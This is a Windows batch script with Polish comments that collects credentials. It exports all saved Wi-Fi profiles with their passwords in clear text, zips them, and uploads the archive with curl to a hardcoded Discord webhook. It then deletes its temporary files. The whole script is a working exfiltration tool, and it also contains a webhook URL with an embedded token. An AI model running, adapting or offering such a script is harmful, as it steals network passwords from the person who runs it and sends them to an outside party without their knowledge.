@echo off
setlocal enabledelayedexpansion

:: Konfiguracja
set "webhook_url=https://discord.com/api/webhooks/1317993100718903359/P9U3Nbxjv1FZSOvgag40vsyCmhsZKmMyspc-pSQlknOtCktSMmweRrSIAvDWeo7yg405"
set "zip_name=WiFi_Profiles.zip"
set "temp_dir=%temp%\wifi_profiles"
set "7z_path=C:\Program Files\7-Zip\7z.exe"  :: Ścieżka do 7-Zip (jeśli jest)

:: Tworzenie tymczasowego folderu
if exist "%temp_dir%" rmdir /s /q "%temp_dir%"
mkdir "%temp_dir%"

:: Pobieranie listy profili Wi-Fi
echo Pobieranie profili Wi-Fi...
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "Profil"') do (
    set "profile_name=%%a"
    set "profile_name=!profile_name:~1!"  :: Usunięcie spacji z początku
    echo Eksportowanie: !profile_name!
    netsh wlan export profile name="!profile_name!" key=clear folder="%temp_dir%"
)

:: Sprawdzenie, czy są pliki .xml
dir /b "%temp_dir%\*.xml" >nul 2>&1
if %errorlevel% neq 0 (
    echo Nie znaleziono profili Wi-Fi!
    pause
    exit /b
)

:: Pakowanie do ZIP (jeśli jest 7-Zip)
if exist "%7z_path%" (
    "%7z_path%" a -tzip "%zip_name%" "%temp_dir%\*" >nul
) else (
    :: Jeśli nie ma 7-Zip, użyj narzędzia Windows (mniej efektywne)
    powershell Compress-Archive -Path "%temp_dir%\*" -DestinationPath "%zip_name%" -Force
)

:: Wysyłanie na Discord (wymaga curl)
echo Wysylanie na Discord...
if exist "%zip_name%" (
    curl -F "file1=@%zip_name%" "%webhook_url%"
    if %errorlevel% equ 0 (
        echo Plik wyslany pomyslnie!
    ) else (
        echo Blad podczas wysylania.
    )
    del "%zip_name%"
) else (
    echo Nie udalo sie utworzyc archiwum ZIP.
)

:: Czyszczenie
rmdir /s /q "%temp_dir%"
pause
